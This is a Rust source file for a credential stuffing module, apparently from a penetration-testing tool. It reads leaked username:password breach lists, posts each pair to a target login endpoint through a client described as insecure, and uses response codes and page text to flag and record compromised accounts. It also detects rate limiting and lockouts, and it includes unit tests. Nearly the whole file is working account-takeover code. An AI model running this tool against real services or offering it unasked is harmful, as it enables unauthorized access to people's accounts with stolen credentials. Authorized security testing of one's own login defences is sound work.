use crate::auth::AuthEngine;
use crate::error::Result;
use crate::utils::create_insecure_http_client;
use serde::{Deserialize, Serialize};

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CredentialStuffingResult {
    pub target: String,
    pub credentials_tested: usize,
    pub successful_logins: usize,
    pub compromised_accounts: Vec<CompromisedAccount>,
    pub rate_limited: bool,
    pub lockout_detected: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CompromisedAccount {
    pub username: String,
    pub password: String,
    pub response_status: u16,
    pub indicators: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CredentialPair {
    pub username: String,
    pub password: String,
}

pub struct CredentialStuffer {
    engine: AuthEngine,
    client: reqwest::Client,
}

impl CredentialStuffer {
    pub fn new(max_attempts: usize, concurrency: usize, timeout_secs: u64) -> Result<Self> {
        let engine = AuthEngine::new(max_attempts, concurrency, timeout_secs, true)?;
        let client = create_insecure_http_client(timeout_secs)?;
        Ok(Self { engine, client })
    }

    pub async fn test(
        &self,
        target: &str,
        credentials: &[CredentialPair],
    ) -> Result<CredentialStuffingResult> {
        let mut result = CredentialStuffingResult {
            target: target.to_string(),
            credentials_tested: 0,
            successful_logins: 0,
            compromised_accounts: Vec::new(),
            rate_limited: false,
            lockout_detected: false,
        };

        for cred in credentials {
            if !self.engine.increment_attempts() || self.engine.should_stop() {
                break;
            }

            let response = self
                .client
                .post(target)
                .header(reqwest::header::CONTENT_TYPE, "application/json")
                .body(
                    serde_json::json!({
                        "username": cred.username,
                        "password": cred.password
                    })
                    .to_string(),
                )
                .send()
                .await;

            result.credentials_tested += 1;

            match response {
                Ok(resp) => {
                    let status = resp.status().as_u16();
                    let body = resp.text().await.unwrap_or_default();

                    if status == 302
                        || (status == 200 && !body.contains("invalid") && !body.contains("error"))
                    {
                        result.successful_logins += 1;
                        result.compromised_accounts.push(CompromisedAccount {
                            username: cred.username.clone(),
                            password: cred.password.clone(),
                            response_status: status,
                            indicators: self.analyze_indicators(&body),
                        });
                    }

                    if status == 429 {
                        result.rate_limited = true;
                    }
                    if status == 423 || body.contains("locked") {
                        result.lockout_detected = true;
                        if self.engine.stop_on_lockout {
                            self.engine.stop();
                        }
                    }
                }
                Err(_) => {
                    result.lockout_detected = true;
                }
            }
        }

        Ok(result)
    }

    fn analyze_indicators(&self, body: &str) -> Vec<String> {
        let mut indicators = Vec::new();
        let lower = body.to_lowercase();

        if lower.contains("welcome") || lower.contains("dashboard") {
            indicators.push("success indicator found".to_string());
        }
        if lower.contains("redirect") {
            indicators.push("redirect after login".to_string());
        }

        indicators
    }

    pub fn load_breach_list(&self, path: &str) -> Result<Vec<CredentialPair>> {
        let content = std::fs::read_to_string(path)?;
        let mut pairs = Vec::new();

        for line in content.lines() {
            let parts: Vec<&str> = line.splitn(2, ':').collect();
            if parts.len() == 2 {
                pairs.push(CredentialPair {
                    username: parts[0].trim().to_string(),
                    password: parts[1].trim().to_string(),
                });
            }
        }

        Ok(pairs)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_credential_stuffing_result_default() {
        let result = CredentialStuffingResult {
            target: "http://example.com/login".to_string(),
            credentials_tested: 0,
            successful_logins: 0,
            compromised_accounts: Vec::new(),
            rate_limited: false,
            lockout_detected: false,
        };
        assert_eq!(result.credentials_tested, 0);
    }

    #[test]
    fn test_compromised_account_creation() {
        let account = CompromisedAccount {
            username: "admin".to_string(),
            password: "admin123".to_string(),
            response_status: 302,
            indicators: vec!["success indicator found".to_string()],
        };
        assert_eq!(account.username, "admin");
        assert_eq!(account.response_status, 302);
    }

    #[test]
    fn test_credential_pair_creation() {
        let pair = CredentialPair {
            username: "test".to_string(),
            password: "pass".to_string(),
        };
        assert_eq!(pair.username, "test");
    }

    #[test]
    fn test_load_breach_list_nonexistent() {
        let stuffer = CredentialStuffer::new(100, 10, 10).unwrap();
        let result = stuffer.load_breach_list("/nonexistent/file.txt");
        assert!(result.is_err());
    }

    #[test]
    fn test_analyze_indicators() {
        let stuffer = CredentialStuffer::new(100, 10, 10).unwrap();
        let body = "Welcome! Redirecting to dashboard...";
        let indicators = stuffer.analyze_indicators(body);
        assert!(!indicators.is_empty());
    }
}
